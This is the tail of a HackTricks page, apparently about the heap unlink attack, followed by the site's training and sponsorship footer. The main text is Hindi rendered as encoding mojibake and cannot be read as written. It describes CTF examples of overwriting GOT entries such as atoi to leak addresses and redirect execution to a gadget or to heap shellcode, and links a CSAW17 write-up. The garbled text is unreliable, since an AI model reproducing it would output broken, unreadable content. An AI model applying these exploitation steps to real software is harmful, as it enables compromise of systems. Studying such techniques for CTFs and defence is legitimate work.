* ‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π, ‡§Ü‡§µ‡§Ç‡§ü‡§®‡•ã‡§Ç ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡§æ ‡§è‡§ï ‡§è‡§∞‡•á ‡§π‡•à‡•§ ‡§è‡§ï ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§π‡§Æ‡§≤‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§™‡§π‡§≤‡•á ‡§Ü‡§µ‡§Ç‡§ü‡§® ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§è‡§∞‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§®‡•á ‡§∏‡•á ‡§ï‡•Å‡§õ ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§π‡§≤‡•á ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§î‡§∞ ‡§á‡§∏ ‡§Ü‡§µ‡§Ç‡§ü‡§® ‡§ï‡•ã ‡§®‡§è ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á‡•§ ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§π ‡§Ö‡§®‡•ç‡§Ø ‡§Ü‡§µ‡§Ç‡§ü‡§®‡•ã‡§Ç ‡§ï‡•á ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã GOT ‡§ï‡•á atoi ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à, ‡§á‡§∏‡•á ‡§≤‡•Ä‡§ï ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü ‡§ï‡§∞‡•á‡§Ç, ‡§î‡§∞ ‡§´‡§ø‡§∞ atoi GOT ‡§ï‡•ã ‡§è‡§ï ‡§ó‡•á‡§ú‡•á‡§ü ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§
* CTF ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡§∏‡•ç‡§ü‡§Æ malloc ‡§î‡§∞ free ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§π‡•à‡§Ç ‡§ú‡•ã ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§è‡§ï ‡§ï‡§Æ‡§ú‡•ã‡§∞‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* ‡§è‡§ï ‡§ì‡§µ‡§∞‡§´‡•ç‡§≤‡•ã ‡§π‡•à ‡§ú‡•ã ‡§ï‡§∏‡•ç‡§ü‡§Æ malloc ‡§ï‡•á FD ‡§î‡§∞ BK ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡•ã (‡§ï‡§∏‡•ç‡§ü‡§Æ) ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§è ‡§ú‡§æ‡§è‡§Ç‡§ó‡•á‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§π‡•Ä‡§™ ‡§Æ‡•á‡§Ç exec ‡§¨‡§ø‡§ü ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è ‡§è‡§ï ‡§π‡•Ä‡§™ ‡§™‡§§‡§æ ‡§≤‡•Ä‡§ï ‡§ï‡§∞‡§®‡§æ ‡§î‡§∞ GOT ‡§∏‡•á ‡§è‡§ï ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§è‡§ï ‡§π‡•Ä‡§™ ‡§ö‡§Ç‡§ï ‡§ï‡•Ä ‡§ì‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§∂‡•á‡§≤‡§ï‡•ã‡§° ‡§π‡•à‡•§

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
